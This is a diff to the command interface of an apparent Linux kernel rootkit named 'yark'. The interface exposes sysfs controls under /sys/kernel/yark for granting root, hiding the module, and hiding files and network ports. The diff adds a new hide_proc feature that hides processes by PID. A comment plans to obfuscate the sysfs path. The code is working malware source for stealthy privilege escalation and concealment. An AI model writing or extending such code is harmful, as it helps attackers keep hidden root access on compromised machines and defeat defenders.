@@ -6,6 +6,7 @@
 #include <linux/module.h>
 #include <linux/string.h>
 #include <linux/sysfs.h>
+#include <linux/types.h>
 
 #include "command.h"
 #include "hide_file.h"
@@ -13,6 +14,7 @@
 #include "main.h"
 #include "give_root.h"
 #include "hide_module.h"
+#include "hide_proc.h"
 
 /*
  * For things about sysfs, see:
@@ -22,7 +24,7 @@
 // TODO: Obfuscate the this path name at compile time:
 #define SYS_DIR_NAME "yark"
 
-/* handlers for hide port */
+/* attribute for hide_port */
 
 static ssize_t hide_port_kobj_list(struct kobject *kobj,
                                    struct kobj_attribute *attr, char *buf) {
@@ -72,7 +74,23 @@ static ssize_t hide_port_kobj_del(struct kobject *kobj,
     return count;
 }
 
-/* handlers for give root */
+static struct kobj_attribute hide_port_kobj_list_attribute =
+    __ATTR(list, 0400, hide_port_kobj_list, NULL);
+static struct kobj_attribute hide_port_kobj_add_attribute =
+    __ATTR(add, 0200, NULL, hide_port_kobj_add);
+static struct kobj_attribute hide_port_kobj_del_attribute =
+    __ATTR(del, 0200, NULL, hide_port_kobj_del);
+
+static struct attribute *hide_port_attrs[] = {
+    &hide_port_kobj_list_attribute.attr, &hide_port_kobj_add_attribute.attr,
+    &hide_port_kobj_del_attribute.attr, NULL};
+
+static struct attribute_group hide_port_attr_group = {
+    .name = "hide_port",
+    .attrs = hide_port_attrs,
+};
+
+/* attribute for give_root */
 
 static ssize_t give_root_kobj_giveme(struct kobject *kobj,
                                      struct kobj_attribute *attr, char *buf) {
@@ -99,7 +117,22 @@ static ssize_t give_root_kobj_give(struct kobject *kobj,
     return count;
 }
 
-/* handlers for hide module */
+static struct kobj_attribute give_root_kobj_give_attribute =
+    __ATTR(give, 0200, NULL, give_root_kobj_give);
+
+static struct kobj_attribute give_root_kobj_giveme_attribute =
+    __ATTR(giveme, 0444, give_root_kobj_giveme, NULL);
+
+static struct attribute *give_root_attrs[] = {
+    &give_root_kobj_give_attribute.attr, &give_root_kobj_giveme_attribute.attr,
+    NULL};
+
+static struct attribute_group give_root_attr_group = {
+    .name = "give_root",
+    .attrs = give_root_attrs,
+};
+
+/* attribute for hide_module */
 
 static ssize_t hide_module_kobj_give_visibility(struct kobject *kobj,
                                                 struct kobj_attribute *attr,
@@ -120,45 +153,6 @@ static ssize_t hide_module_kobj_give_visibility(struct kobject *kobj,
         return retval;
     return count;
 }
-
-static struct kobject *module_kobj;
-
-/* attribute for hide_port */
-
-static struct kobj_attribute hide_port_kobj_list_attribute =
-    __ATTR(list, 0400, hide_port_kobj_list, NULL);
-static struct kobj_attribute hide_port_kobj_add_attribute =
-    __ATTR(add, 0200, NULL, hide_port_kobj_add);
-static struct kobj_attribute hide_port_kobj_del_attribute =
-    __ATTR(del, 0200, NULL, hide_port_kobj_del);
-
-static struct attribute *hide_port_attrs[] = {
-    &hide_port_kobj_list_attribute.attr, &hide_port_kobj_add_attribute.attr,
-    &hide_port_kobj_del_attribute.attr, NULL};
-
-static struct attribute_group hide_port_attr_group = {
-    .name = "hide_port",
-    .attrs = hide_port_attrs,
-};
-
-/* attribute for give_root */
-
-static struct kobj_attribute give_root_kobj_give_attribute =
-    __ATTR(give, 0200, NULL, give_root_kobj_give);
-
-static struct kobj_attribute give_root_kobj_giveme_attribute =
-    __ATTR(giveme, 0444, give_root_kobj_giveme, NULL);
-
-static struct attribute *give_root_attrs[] = {
-    &give_root_kobj_give_attribute.attr, &give_root_kobj_giveme_attribute.attr,
-    NULL};
-
-static struct attribute_group give_root_attr_group = {
-    .name = "give_root",
-    .attrs = give_root_attrs,
-};
-
-/* attribute for hide_module */
 
 static struct kobj_attribute hide_module_kobj_visibility_attribute =
     __ATTR(vis, 0200, NULL, hide_module_kobj_give_visibility);
@@ -229,6 +223,77 @@ static struct attribute_group hide_file_attr_group = {
     .attrs = hide_file_attrs,
 };
 
+/* attribute for hide_proc */
+
+static ssize_t hide_proc_kobj_list(struct kobject *kobj,
+                                   struct kobj_attribute *attr, char *buf) {
+    size_t remain_size = PAGE_SIZE;
+    size_t offset = 0;
+    int count;
+    struct hide_proc_info *cur;
+
+    cur = get_hide_proc_info_list_head();
+    cur = cur->next;
+    while (cur != NULL)
+    {
+        if (remain_size <= 0)
+            break;
+        count = scnprintf(buf + offset, remain_size, "%d\n", cur->pid);
+        remain_size -= count;
+        offset += count;
+        cur = cur->next;    
+    }
+    return offset;
+}
+
+static ssize_t hide_proc_kobj_add(struct kobject *kobj,
+                                  struct kobj_attribute *attr, const char *buf,
+                                  size_t count) {
+    pid_t pid;
+    int retval;
+
+    retval = kstrtouint(buf, 10, &pid);
+    if (retval)
+        return retval;
+    retval = hide_proc_add(pid);
+    if (retval < 0)
+        return retval;
+    return count;
+}
+
+static ssize_t hide_proc_kobj_del(struct kobject *kobj,
+                                  struct kobj_attribute *attr, const char *buf,
+                                  size_t count) {
+    pid_t pid;
+    int retval;
+
+    retval = kstrtouint(buf, 10, &pid);
+    if (retval)
+        return retval;
+    retval = hide_proc_del(pid);
+    if (retval < 0)
+        return retval;
+    return count;
+}
+
+static struct kobj_attribute hide_proc_kobj_list_attribute =
+    __ATTR(list, 0400, hide_proc_kobj_list, NULL);
+static struct kobj_attribute hide_proc_kobj_add_attribute =
+    __ATTR(add, 0200, NULL, hide_proc_kobj_add);
+static struct kobj_attribute hide_proc_kobj_del_attribute =
+    __ATTR(del, 0200, NULL, hide_proc_kobj_del);
+
+static struct attribute *hide_proc_attrs[] = {
+    &hide_proc_kobj_list_attribute.attr, &hide_proc_kobj_add_attribute.attr,
+    &hide_proc_kobj_del_attribute.attr, NULL};
+
+static struct attribute_group hide_proc_attr_group = {
+    .name = "hide_proc",
+    .attrs = hide_proc_attrs,
+};
+
+static struct kobject *module_kobj;
+
 int command_start(void) {
     int retval = 0;
 
@@ -252,6 +317,10 @@ int command_start(void) {
         goto failed;
     /* create /sys/kernel/${SYS_DIR_NAME}/hide_file/ */
     retval = sysfs_create_group(module_kobj, &hide_file_attr_group);
+    if (retval)
+        goto failed;
+    /* create /sys/kernel/${SYS_DIR_NAME}/hide_proc/ */
+    retval = sysfs_create_group(module_kobj, &hide_proc_attr_group);
     if (retval)
         goto failed;
     return retval;
